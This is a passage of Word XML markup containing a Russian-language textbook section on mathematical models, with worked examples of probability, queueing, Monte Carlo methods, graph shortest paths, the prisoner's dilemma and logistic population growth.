    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>4.1. Модель броска монеты</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Вероятность выпадения орла:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>P(орёл) = 0.5</w:t>
        <w:br/>
        <w:t>P(решка) = 0.5</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Какова вероятность выпадения </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>двух орлов подряд</w:t>
      </w:r>
      <w:r>
        <w:t>?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>P(2 орла) = P(орёл) × P(орёл) = 0.5 × 0.5 = 0.25 (25%)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>4.2. Модель очередей (теория массового обслуживания)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Модель для анализа очередей: сколько нужно касс в магазине, чтобы очередь не была слишком длинной?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Основные параметры:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`λ` — интенсивность прихода клиентов (клиентов/час)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`μ` — интенсивность обслуживания (клиентов/час на одну кассу)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`ρ = λ / μ` — коэффициент загрузки системы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Формула среднего времени ожидания в очереди (модель M/M/1):</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>W = ρ / (μ × (1 - ρ))</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> В магазин приходит 40 клиентов/час, касса обслуживает 50 клиентов/час.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>ρ = 40 / 50 = 0.8 (загрузка 80%)</w:t>
        <w:br/>
        <w:t>W = 0.8 / (50 × (1 - 0.8)) = 0.8 / (50 × 0.2) = 0.8 / 10 = 0.08 часа = 4.8 минуты</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ответ:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Средний клиент ждёт в очереди около 5 минут.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что будет, если добавить вторую кассу?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Загрузка упадёт, время ожидания сократится. (Для расчёта используется модель M/M/c, где `c` — количество касс.)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>4.3. Модель Монте-Карло</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Метод Монте-Карло</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это метод имитационного моделирования на основе </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>случайных чисел</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Идея:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Запускаешь симуляцию много раз с случайными параметрами и получаешь распределение результатов.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 1: Вычисление числа π методом Монте-Карло</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Идея:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Рисуем квадрат со стороной 1.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Вписываем в него четверть круга радиуса 1.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Генерируем случайные точки (x, y) внутри квадрата.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Проверяем, попала ли точка внутрь круга: `x² + y² ≤ 1`.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Считаем отношение:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>π ≈ 4 × (количество точек внутри круга) / (общее количество точек)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Генерируем 10 000 случайных точек, 7854 попали внутрь круга.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>π ≈ 4 × 7854 / 10000 = 3.1416</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>(Точное значение π ≈ 3.14159...)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 2: Оценка риска инвестиций</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Допустим, ты вкладываешь деньги в акции. Доходность акций случайна и зависит от множества факторов.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Модель:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Средняя годовая доходность: 10%</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Стандартное отклонение: 15% (волатильность)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Методом Монте-Карло симулируем 10 000 сценариев (каждый раз генерируется случайная доходность из нормального распределения) и смотрим, в скольких случаях портфель вырос, а в скольких упал.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Результат:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>В 70% сценариев портфель вырос</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>В 30% сценариев портфель упал</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Средняя доходность: +8%</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Худший сценарий: -25%</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Риск есть, но в целом ожидается рост.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>5. Теория графов</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Граф</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это математическая модель для описания </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>связей между объектами</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Основные понятия:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Вершина (узел)** — объект</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Ребро (связь)** — соединение между объектами</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Ориентированный граф** — рёбра имеют направление (→)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Взвешенный граф** — рёбрам присвоены веса (расстояния, стоимости, времена)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>5.1. Граф социальной сети</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Узлы = пользователи, рёбра = дружба.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Алиса ←→ Боб</w:t>
        <w:br/>
        <w:t>Боб ←→ Чарли</w:t>
        <w:br/>
        <w:t>Чарли ←→ Алиса</w:t>
        <w:br/>
        <w:t>Боб ←→ Дэйв</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Граф позволяет:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Найти друзей друзей (рекомендации друзей: "Возможно, вы знаете Дэйва?")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Найти кратчайший путь между пользователями (степень разделения)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Определить влиятельных пользователей (у кого больше всего связей)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>5.2. Граф дорог (навигация)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Узлы = города, рёбра = дороги, вес ребра = расстояние.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Москва ←(650 км)→ Санкт-Петербург</w:t>
        <w:br/>
        <w:t>Москва ←(450 км)→ Нижний Новгород</w:t>
        <w:br/>
        <w:t>Нижний Новгород ←(400 км)→ Казань</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Найти кратчайший путь от Москвы до Казани.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Алгоритм Дейкстры:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Прямой путь: Москва → Казань (нет прямого ребра)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Через Нижний Новгород: Москва → Нижний Новгород → Казань = 450 + 400 = 850 км</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ответ:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Кратчайший путь: 850 км через Нижний Новгород.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>5.3. Граф задач (зависимости)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Используется в управлении проектами (диаграмма Ганта, PERT).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Задача A (Разработка ТЗ) → Задача B (Проектирование)</w:t>
        <w:br/>
        <w:t>Задача B → Задача C (Реализация)</w:t>
        <w:br/>
        <w:t>Задача C → Задача D (Тестирование)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Определить критический путь (longest path) — последовательность задач, определяющую минимальное время завершения проекта.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>6. Теория игр</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Теория игр</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — раздел математики, изучающий </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>стратегическое взаимодействие</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> между игроками (людьми, компаниями, странами).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Основные понятия:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Игра** — ситуация с несколькими игроками, каждый выбирает стратегию</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Стратегия** — план действий игрока</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Выигрыш** — результат игры для каждого игрока</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>6.1. Дилемма заключённого</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Классическая задача теории игр.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ситуация:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Двое подозреваемых (Алиса и Боб) арестованы. У каждого два варианта: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>молчать</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> или </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>сдать другого</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Таблица выигрышей:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>|                      | Боб молчит        | Боб сдаёт        |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| -------------------- | ----------------- | ---------------- |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Алиса молчит</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">     | Оба: 1 год тюрьмы | Алиса: 10 лет, Боб: 0 лет |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Алиса сдаёт</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">      | Алиса: 0 лет, Боб: 10 лет | Оба: 5 лет       |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Рациональный выбор:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Если Боб молчит, Алисе выгодно сдать (0 лет вместо 1 года)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Если Боб сдаёт, Алисе выгодно сдать (5 лет вместо 10 лет)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Равновесие Нэша:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Оба сдают друг друга → оба получают по 5 лет.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ирония:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Если бы оба молчали, оба получили бы всего по 1 году. Но из-за недоверия оба сдают друг друга и получают худший исход.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Применение:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Анализ олигополий (компании конкурируют на цены), международные конфликты, экологические проблемы (загрязнение окружающей среды).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>6.2. Игра "камень-ножницы-бумага"</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Стратегии:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Камень, Ножницы, Бумага.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Правила:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Камень бьёт Ножницы</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Ножницы режут Бумагу</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Бумага оборачивает Камень</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Оптимальная стратегия:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Случайный выбор с вероятностью 1/3 для каждого варианта (смешанная стратегия).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Если играешь детерминированно (всегда выбираешь Камень), противник предскажет и всегда будет выбирать Бумагу.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.3.3. Примеры математических моделей</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 1: Модель логистического роста популяции</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проблема экспоненциального роста:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> В главе 4.2 мы рассмотрели модель `P(t) = P₀ × e^(r×t)` — экспоненциальный рост. Но это нереалистично, потому что популяция не может расти бесконечно (ограничены ресурсы, пространство, еда).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Логистическая модель</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> учитывает </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ёмкость среды</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (carrying capacity) `K` — максимальное количество особей, которое может прокормить среда.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Дифференциальное уравнение:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>dP/dt = r × P × (1 - P/K)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>где:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`P` — численность популяции</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`r` — коэффициент роста</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`K` — ёмкость среды</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>P(t) = K / (1 + ((K - P₀) / P₀) × e^(-r×t))</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>График:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> S-образная кривая (sigmoid). Сначала рост экспоненциальный, затем замедляется и стабилизируется около `K`.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Популяция кроликов на острове.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`P₀ = 100` (начальная численность)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`r = 0.5` (коэффициент роста)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`K = 1000` (остров может прокормить максимум 1000 кроликов)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Через 10 лет:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>P(10) = 1000 / (1 + ((1000 - 100) / 100) × e^(-0.5×10))</w:t>
        <w:br/>
        <w:t>P(10) = 1000 / (1 + 9 × e^(-5))</w:t>
        <w:br/>
        <w:t>P(10) = 1000 / (1 + 9 × 0.0067)</w:t>
        <w:br/>
        <w:t>P(10) = 1000 / (1 + 0.06)</w:t>
        <w:br/>
        <w:t>P(10) ≈ 943 кролика</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ответ:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Популяция кроликов приблизилась к ёмкости среды (943 из 1000).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
